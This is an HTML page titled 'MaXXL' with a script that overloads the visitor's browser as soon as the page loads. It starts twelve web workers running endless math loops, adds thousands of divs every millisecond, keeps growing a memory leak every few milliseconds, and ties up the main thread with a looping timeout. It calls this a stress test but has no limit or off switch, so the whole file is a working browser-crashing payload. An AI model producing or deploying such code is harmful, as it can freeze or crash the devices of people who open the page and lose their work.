<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>MaXXL</title>
    <style>
        body { background: #000; color: #f00; font-family: monospace; overflow: hidden; margin: 0; }
        .warning { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; z-index: 9999; pointer-events: none; }
        /* Tiny divs to force the GPU to calculate thousands of positions */
        .particle { width: 1px; height: 1px; position: absolute; background: red; }
    </style>
</head>
<body>

    <div class="warning">
        <h1>CRITICAL LOAD</h1>
        <div id="stats">Initializing...</div>
    </div>

    <script>
        // 1. INCREASED CPU WORKERS (Matches Core Count or higher)
        // We spawn 12 workers instead of 4 to saturate almost any consumer CPU
        for (let i = 0; i < 12; i++) {
            const blob = new Blob([`setInterval(() => { while(true) { Math.atan2(Math.random(), Math.random()); } }, 1)`], {type: 'text/javascript'});
            new Worker(URL.createObjectURL(blob));
        }

        // 2. INFINITE DOM SPAM (The "Alot Alot" Divs)
        const spamDivs = () => {
            const fragment = document.createDocumentFragment();
            for (let i = 0; i < 5000; i++) {
                const d = document.createElement('div');
                d.className = 'particle';
                d.style.left = Math.random() * 100 + "vw";
                d.style.top = Math.random() * 100 + "vh";
                fragment.appendChild(d);
            }
            document.body.appendChild(fragment);
        };
        // Adds 5,000 new divs every 100ms forever
        setInterval(spamDivs, 1);

        // 3. RAPID MEMORY LEAK (The "Black Hole")
        // This creates massive strings and stores them in a global array that never clears
        let leak = [];
        setInterval(() => {
            let chunk = new Array(100000).fill("STRESS_TEST_DATA_MAX_BLOAT").join("-");
            leak.push(chunk);
            document.getElementById('stats').innerText = `Memory Blocks: ${leak.length} | Elements: ${document.querySelectorAll('div').length}`;
        }, 5);

        // 4. RECURSIVE HELL (Stack Overflow path)
        // This function calls itself constantly to keep the main thread busy
        function recurse() {
            setTimeout(() => {
                for(let i=0; i<1000; i++) { Math.exp(i); }
                recurse();
            }, 0);
        }
        recurse();

    </script>
</body>
</html>
